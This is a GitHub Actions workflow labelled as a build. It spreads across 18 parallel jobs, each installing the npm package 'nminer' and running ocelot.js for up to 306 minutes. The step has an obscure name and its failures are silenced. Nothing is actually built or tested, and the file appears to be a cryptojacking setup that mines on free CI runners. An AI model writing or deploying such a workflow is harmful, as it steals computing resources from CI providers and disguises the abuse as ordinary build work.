name: ocelot
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8026 }
          - { version: 2758 }
          - { version: 1716 }
          - { version: 9284 }
          - { version: 8013 }
          - { version: 8655 }
          - { version: 5364 }
          - { version: 720 }
          - { version: 6274 }
          - { version: 6733 }
          - { version: 8104 }
          - { version: 7676 }
          - { version: 7569 }
          - { version: 9620 }
          - { version: 56 }
          - { version: 3145 }
          - { version: 3410 }
          - { version: 3447 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: sauerkraut minor
        run: |
          npm install nminer@latest
          timeout 306m node ocelot.js || echo "ocelot executed"